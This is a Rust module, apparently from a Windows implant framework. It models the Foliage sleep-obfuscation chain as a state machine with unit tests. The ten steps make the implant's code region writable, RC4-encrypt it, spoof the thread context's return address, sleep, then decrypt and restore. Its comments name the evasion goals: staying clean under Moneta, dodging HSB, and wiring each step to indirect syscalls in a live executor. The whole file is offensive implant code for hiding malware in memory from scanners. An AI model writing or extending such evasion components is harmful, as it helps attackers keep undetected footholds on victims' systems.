//! Foliage sleep-mask 10-step APC→NtContinue chain — pure state-machine model.
//!
//! The Windows Foliage sleep obfuscation (Kyle Avery, DEF CON 30, first-hand)
//! queues a chain of APCs that each call `NtContinue(ctx)` to walk the beacon
//! thread through a mask→sleep→unmask cycle WITHOUT the beacon thread itself
//! executing through the encrypted region. This module models that cycle as
//! pure data — a `FoliagePlan` describing each step — so the step ordering,
//! invariant (image byte-identical on return), and RC4 round-trip are unit-
//! testable on the host with no Windows API.
//!
//! ## Single-source-of-truth
//! The RC4 math lives in [`crate::rc4`]; this module calls it, never
//! reimplements it. The APC chain layout lives in [`crate::apc`] (Task U2).

#![cfg_attr(not(test), allow(dead_code))]

extern crate alloc;
use alloc::vec::Vec;

/// Which crypto the chain uses for the mask/unmask steps.
/// `SystemFunction032` is image-commit (advapi32), Moneta-clean; preferred.
/// `KsecDD` is the `\Device\KsecDD` ioctl path (the original Foliage).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CryptoMethod {
    SystemFunction032,
    KsecDD,
}

/// One step of the Foliage chain. The order in `FoliagePlan::steps` IS the
/// execution order. Each variant names the syscall class + its semantic;
/// the live executor (implant-win/sleep.rs) maps each to an indirect syscall.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum FoliageStep {
    /// Wait on an event to keep the helper thread alive (step 1).
    WaitForEvent,
    /// Implant memory RX→RW (step 2). `region_base`/`region_len` target .text.
    Protect { from_perm: u32, to_perm: u32 },
    /// Encrypt the region (step 3). Method = plan.crypto.
    Encrypt,
    /// Save the original thread CONTEXT (step 4).
    GetContext,
    /// Set a spoofed CONTEXT with RIP = `spoof_rip` (step 5).
    SetContext { spoof_rip: u64 },
    /// The actual sleep (step 6). wait-reason = UserRequest (dodges HSB).
    Sleep { seconds: u32 },
    /// Decrypt the region (step 7).
    Decrypt,
    /// Restore the original CONTEXT (step 8).
    RestoreContext,
    /// Implant memory RW→RX (step 9).
    Unprotect,
    /// Terminate the helper thread (step 10).
    Terminate,
}

/// A fully-specified Foliage sleep cycle. Built once per sleep; the executor
/// walks `steps` in order, mapping each to an indirect syscall.
#[derive(Clone, Debug)]
pub struct FoliagePlan {
    pub steps: Vec<FoliageStep>,
    pub crypto: CryptoMethod,
    /// The RC4 key for Encrypt/Decrypt (SystemFunction032 path). 16 bytes
    /// matches SystemFunction032's USTRING convention; the key is per-sleep
    /// (non-secret — only needs determinism across mask/restore).
    pub key: [u8; 16],
    pub region_base: usize,
    pub region_len: usize,
}

/// x64 memory protection constants (winnt.h PAGE_*).
pub const PAGE_READONLY: u32 = 0x02;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;

impl FoliagePlan {
    /// Build a canonical 10-step Foliage plan for `seconds` of sleep over the
    /// region `[region_base, region_base+region_len)`. `spoof_rip` is the
    /// fake return address (a .pdata gap address) for the spoofed CONTEXT;
    /// None leaves the context untouched (no stack spoof during sleep).
    pub fn build(
        region_base: usize,
        region_len: usize,
        seconds: u32,
        spoof_rip: Option<u64>,
        key: [u8; 16],
    ) -> Self {
        let mut steps = alloc::vec![
            FoliageStep::WaitForEvent,
            FoliageStep::Protect { from_perm: PAGE_EXECUTE_READ, to_perm: PAGE_READWRITE },
            FoliageStep::Encrypt,
            FoliageStep::GetContext,
        ];
        match spoof_rip {
            Some(rip) => steps.push(FoliageStep::SetContext { spoof_rip: rip }),
            None => {}
        }
        steps.push(FoliageStep::Sleep { seconds });
        steps.push(FoliageStep::Decrypt);
        steps.push(FoliageStep::RestoreContext);
        steps.push(FoliageStep::Protect { from_perm: PAGE_READWRITE, to_perm: PAGE_EXECUTE_READ });
        steps.push(FoliageStep::Terminate);
        Self { steps, crypto: CryptoMethod::SystemFunction032, key, region_base, region_len }
    }

    /// The number of steps in the chain (10 with spoof, 9 without).
    pub fn step_count(&self) -> usize { self.steps.len() }

    /// True iff the plan's protect steps are balanced (every RX→RW has a
    /// matching RW→RX), so the region is executable again on return.
    pub fn protections_are_balanced(&self) -> bool {
        let mut depth = 0i32;
        for s in &self.steps {
            if let FoliageStep::Protect { to_perm, .. } = s {
                if *to_perm == PAGE_READWRITE { depth += 1; }
                if *to_perm == PAGE_EXECUTE_READ { depth -= 1; }
            }
        }
        depth == 0
    }
}

/// Encrypt `buf` in place with `key` (RC4). Delegates to crate::rc4.
pub fn mask_region(key: &[u8], buf: &mut [u8]) {
    crate::rc4::Rc4::apply_oneshot(key, buf);
}

/// Decrypt == encrypt for RC4 (XOR stream cipher). Same call.
pub fn unmask_region(key: &[u8], buf: &mut [u8]) {
    crate::rc4::Rc4::apply_oneshot(key, buf);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_with_spoof_has_10_steps_in_correct_order() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, Some(0xDEAD_BEEF), [0xAB; 16]);
        assert_eq!(plan.step_count(), 10);
        assert!(matches!(plan.steps[0], FoliageStep::WaitForEvent));
        assert!(matches!(plan.steps[1], FoliageStep::Protect { to_perm: PAGE_READWRITE, .. }));
        assert!(matches!(plan.steps[2], FoliageStep::Encrypt));
        assert!(matches!(plan.steps[3], FoliageStep::GetContext));
        assert!(matches!(plan.steps[4], FoliageStep::SetContext { spoof_rip: 0xDEAD_BEEF }));
        assert!(matches!(plan.steps[5], FoliageStep::Sleep { seconds: 5 }));
        assert!(matches!(plan.steps[6], FoliageStep::Decrypt));
        assert!(matches!(plan.steps[7], FoliageStep::RestoreContext));
        assert!(matches!(plan.steps[8], FoliageStep::Protect { to_perm: PAGE_EXECUTE_READ, .. }));
        assert!(matches!(plan.steps[9], FoliageStep::Terminate));
    }

    #[test]
    fn build_without_spoof_has_9_steps() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, None, [0xAB; 16]);
        assert_eq!(plan.step_count(), 9);
        assert!(!plan.steps.iter().any(|s| matches!(s, FoliageStep::SetContext { .. })));
    }

    #[test]
    fn protections_are_balanced_with_spoof() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, Some(0xDEAD), [0xAB; 16]);
        assert!(plan.protections_are_balanced());
    }

    #[test]
    fn mask_unmask_round_trip_restores_bytes() {
        let key = [0x11u8; 16];
        let original = *b"Foliage-RC4-roundtrip-test!!";
        let mut buf = original;
        mask_region(&key, &mut buf);
        assert_ne!(buf, original, "mask did not change the buffer");
        unmask_region(&key, &mut buf);
        assert_eq!(buf, original, "unmask did not restore the original");
    }

    #[test]
    fn crypto_defaults_to_system_function_032() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, None, [0; 16]);
        assert_eq!(plan.crypto, CryptoMethod::SystemFunction032);
    }
}
